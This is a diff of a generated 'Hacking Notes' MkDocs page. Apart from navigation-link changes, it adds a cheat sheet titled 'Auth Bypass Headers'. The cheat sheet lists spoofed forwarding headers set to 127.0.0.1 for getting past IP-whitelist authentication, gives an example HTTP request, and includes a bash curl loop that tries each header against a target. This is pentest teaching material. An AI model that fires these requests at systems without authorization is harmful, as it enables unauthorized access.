@@ -9,24 +9,24 @@
       
       
       
-        <link rel="prev" href="../../Recon/recon/">
+        <link rel="prev" href="../2022-07-30-pivot-101/">
       
       
-        <link rel="next" href="../../Windows/PowerShell/">
+        <link rel="next" href="../2022-10-04-pentesting-email-servers/">
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.8">
     
     
       
-        <title>Web Application Hacking - Hacking Notes</title>
+        <title>Auth Bypass Headers" - Hacking Notes</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.0d440cfe.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0d440cfe.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.2505c338.min.css">
       
       
 
@@ -42,7 +42,7 @@
       
     
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -67,7 +67,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#web-application-hacking" class="md-skip">
+        <a href="#auth-bypass-headers" class="md-skip">
           Skip to content
         </a>
       
@@ -81,7 +81,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="Hacking Notes" class="md-header__button md-logo" aria-label="Hacking Notes" data-md-component="logo">
+    <a href="../../.." title="Hacking Notes" class="md-header__button md-logo" aria-label="Hacking Notes" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
@@ -100,7 +100,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Web Application Hacking
+              Auth Bypass Headers"
             
           </span>
         </div>
@@ -167,7 +167,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Hacking Notes" class="md-nav__button md-logo" aria-label="Hacking Notes" data-md-component="logo">
+    <a href="../../.." title="Hacking Notes" class="md-nav__button md-logo" aria-label="Hacking Notes" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
@@ -186,7 +186,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         Welcome to MkDocs
       </a>
     </li>
@@ -199,14 +199,16 @@
 
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
       
       
       
@@ -215,7 +217,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_2">
           <span class="md-nav__icon md-icon"></span>
           Cheatsheets
@@ -226,14 +228,16 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
       
       
       
@@ -242,7 +246,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_2_1">
           <span class="md-nav__icon md-icon"></span>
           General
@@ -255,7 +259,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/2022-07-30-file-transfers-101/" class="md-nav__link">
+      <a href="../2022-07-30-file-transfers-101/" class="md-nav__link">
         File Transfers 101
       </a>
     </li>
@@ -269,7 +273,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/2022-07-30-pivot-101/" class="md-nav__link">
+      <a href="../2022-07-30-pivot-101/" class="md-nav__link">
         Pivoting & Lateral Movement
       </a>
     </li>
@@ -281,11 +285,59 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/2022-08-07-auth-bypass-headers/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Auth Bypass Headers"
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Auth Bypass Headers"
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#example-usage" class="md-nav__link">
+    Example Usage
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#automation-block" class="md-nav__link">
+    Automation Block
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -297,7 +349,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/2022-10-04-pentesting-email-servers/" class="md-nav__link">
+      <a href="../2022-10-04-pentesting-email-servers/" class="md-nav__link">
         Email Pentesting
       </a>
     </li>
@@ -311,7 +363,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/Kubernetes_Pentesting/" class="md-nav__link">
+      <a href="../Kubernetes_Pentesting/" class="md-nav__link">
         Pentesting Kubernetes
       </a>
     </li>
@@ -325,7 +377,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/cheatsheet_js/" class="md-nav__link">
+      <a href="../cheatsheet_js/" class="md-nav__link">
         Commands
       </a>
     </li>
@@ -339,7 +391,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/hydra_cheat_sheet/" class="md-nav__link">
+      <a href="../hydra_cheat_sheet/" class="md-nav__link">
         Hydra Cheat Sheet
       </a>
     </li>
@@ -353,7 +405,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/msfvenom_cheatsheet/" class="md-nav__link">
+      <a href="../msfvenom_cheatsheet/" class="md-nav__link">
         MSFVenom Cheatsheet
       </a>
     </li>
@@ -367,7 +419,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/General/splunk_cheat_sheet/" class="md-nav__link">
+      <a href="../splunk_cheat_sheet/" class="md-nav__link">
         Splunk Cheatsheet
       </a>
     </li>
@@ -415,7 +467,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/Linux/2022-07-30-x-without-y/" class="md-nav__link">
+      <a href="../../Linux/2022-07-30-x-without-y/" class="md-nav__link">
         X Without Y (Living off the Land)
       </a>
     </li>
@@ -429,7 +481,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/Linux/Powershell_Empire/" class="md-nav__link">
+      <a href="../../Linux/Powershell_Empire/" class="md-nav__link">
         Powershell Empire
       </a>
     </li>
@@ -443,7 +495,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/Linux/linux/" class="md-nav__link">
+      <a href="../../Linux/linux/" class="md-nav__link">
         Linux 101
       </a>
     </li>
@@ -491,7 +543,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/Windows/101_windows/" class="md-nav__link">
+      <a href="../../Windows/101_windows/" class="md-nav__link">
         Windows Privilege Escalation 101
       </a>
     </li>
@@ -505,7 +557,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/Windows/2022-07-09-impacket/" class="md-nav__link">
+      <a href="../../Windows/2022-07-09-impacket/" class="md-nav__link">
         Impacket Toolset
       </a>
     </li>
@@ -519,7 +571,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/Windows/2022-07-10-bloodhound/" class="md-nav__link">
+      <a href="../../Windows/2022-07-10-bloodhound/" class="md-nav__link">
         BloodHound
       </a>
     </li>
@@ -533,7 +585,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/Windows/2022-08-10-golden-ticket/" class="md-nav__link">
+      <a href="../../Windows/2022-08-10-golden-ticket/" class="md-nav__link">
         Golden Tickets
       </a>
     </li>
@@ -547,7 +599,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/Windows/2023-01-15-101_icalcs/" class="md-nav__link">
+      <a href="../../Windows/2023-01-15-101_icalcs/" class="md-nav__link">
         ICACLs 101
       </a>
     </li>
@@ -603,7 +655,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Recon/mapping/" class="md-nav__link">
+      <a href="../../../Recon/mapping/" class="md-nav__link">
         Application Mapping
       </a>
     </li>
@@ -617,7 +669,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Recon/recon/" class="md-nav__link">
+      <a href="../../../Recon/recon/" class="md-nav__link">
         Recon and Information Gathering
       </a>
     </li>
@@ -637,16 +689,14 @@
 
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
       
       
       
@@ -655,7 +705,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_4">
           <span class="md-nav__icon md-icon"></span>
           Web
@@ -666,21 +716,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../../Web/web_hacking/" class="md-nav__link">
         Web Application Hacking
       </a>
-      
     </li>
   
 
@@ -727,7 +767,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Windows/PowerShell/" class="md-nav__link">
+      <a href="../../../Windows/PowerShell/" class="md-nav__link">
         PowerShell
       </a>
     </li>
@@ -741,7 +781,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Windows/windows_101/" class="md-nav__link">
+      <a href="../../../Windows/windows_101/" class="md-nav__link">
         Windows 101
       </a>
     </li>
@@ -775,6 +815,28 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#example-usage" class="md-nav__link">
+    Example Usage
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#automation-block" class="md-nav__link">
+    Automation Block
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -789,7 +851,72 @@
 
 
 
-<h1 id="web-application-hacking">Web Application Hacking</h1>
+<h1 id="auth-bypass-headers">Auth Bypass Headers"</h1>
+<p>Adapted from this tweet:</p>
+<blockquote class="twitter-tweet"><p lang="en" dir="ltr">I have found multiple auth bypass issues using below Headers<a href="https://twitter.com/hashtag/bugbountytips?src=hash&amp;ref_src=twsrc%5Etfw">#bugbountytips</a> <a href="https://twitter.com/hashtag/bugbounty?src=hash&amp;ref_src=twsrc%5Etfw">#bugbounty</a> <a href="https://t.co/R82TXWiyDX">pic.twitter.com/R82TXWiyDX</a></p>&mdash; ¯\_(ツ)_/¯85 (@BountyOverflow) <a href="https://twitter.com/BountyOverflow/status/1555786315232206848?ref_src=twsrc%5Etfw">August 6, 2022</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>The following headers can potentially be used to bypass authentication on a webserver.</p>
+<ul>
+<li>X-Forwarded: 127.0.0.1</li>
+<li>X-Forwarded-By: 127.0.0.1</li>
+<li>X-Forwarded-For: 127.0.0.1</li>
+<li>X-Forwarded-For-Original: 127.0.0.1</li>
+<li>X-Forwarder-For: 127.0.0.1</li>
+<li>X-Forward-For: 127.0.0.1</li>
+<li>Forwarded-For: 127.0.0.1</li>
+<li>Forwarded-For-Ip: 127.0.0.1</li>
+<li>X-Custom-IP-Authorization: 127.0.0.1</li>
+<li>X-Originating-Ip: 127.0.0.1</li>
+<li>X-Remote-IP: 127.0.0.1</li>
+<li>X-Remote-Addr: 127.0.0.1</li>
+<li>X-Trusted-IP: 127.0.0.1</li>
+<li>X-Requested-By: 127.0.0.1</li>
+<li>X-Requested-For: 127.0.0.1</li>
+</ul>
+<h2 id="example-usage">Example Usage</h2>
+<p>Scenario: You try to access <code>/login</code> and get a custom <code>401</code> response that says something like:</p>
+<p><code>IP not on Whitelist!</code></p>
+<p>(not a likely response but serves as an example)</p>
+<p>You'd then try and send the following request:</p>
+<pre><code class="language-bash">GET /login HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
+Host: bullsec.xyz
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+X-Forwarded-For: 127.0.0.1
+</code></pre>
+<blockquote>
+<p>That endpoint doesn't exist on this site this is not a lab.
+{: .prompt-warning}</p>
+</blockquote>
+<p>The idea is that the webserver will parse the <code>X-Forwarded-For</code> header and assume that the request has been forwarded to it on behalf of <code>127.0.0.1</code> / <code>localhost</code> and let you access the "Blocked" <code>/login</code> endpoint. </p>
+<h2 id="automation-block">Automation Block</h2>
+<pre><code class="language-bash">X-Forwarded: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Forward-For: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded-For-Ip: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Originating-Ip: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Trusted-IP: 127.0.0.1
+X-Requested-By: 127.0.0.1
+X-Requested-For: 127.0.0.1
+</code></pre>
+<blockquote>
+<p>Copy the above into a text file</p>
+</blockquote>
+<pre><code class="language-bash">TARGET=&lt;target-ip-address&gt;
+for x in $(cat headers.txt);do curl -v $TARGET -H &quot;$x&quot; ; done
+</code></pre>
+<p>That's your lot.</p>
+<p>Enjoy,</p>
 
 
 
@@ -827,10 +954,10 @@
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
-    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.db81ec45.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.db81ec45.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
-      <script src="../../assets/javascripts/bundle.a00a7c5e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.a00a7c5e.min.js"></script>
       
     
   </body>
